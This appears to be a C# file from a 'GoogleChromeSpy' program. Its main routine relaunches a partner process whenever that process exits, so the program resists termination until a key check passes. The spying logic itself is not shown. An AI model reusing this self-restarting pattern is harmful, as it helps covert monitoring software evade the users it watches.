using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace GoogleChromeSpy
{
    internal class Program
    {
        static Process spyProcess = new Process();
        static string path = String.Empty;
        static ChromeSpy chromeSpy = new ChromeSpy(new TimeSpan(0,1,0), "chrome");
        
        static void Main(string[] args)
        {
            if(args.Length != 0)
            {
                spyProcess = Process.GetProcessesByName(args[0])[0];
                spyProcess.EnableRaisingEvents = true;
                spyProcess.Exited += SpyProcess_Exited;
                path = spyProcess.MainModule.FileName;
            }

            while (true)
           {
                if (chromeSpy.KeyIsCorrect == true)
                {
                    spyProcess.Kill();
                    return;
                }
            }
            Console.ReadLine();
        }

        private static void SpyProcess_Exited(object sender, EventArgs e)
        {

            spyProcess = Process.Start(path,Process.GetCurrentProcess().ProcessName);
            path = spyProcess.MainModule.FileName;
            
        }
    }
}
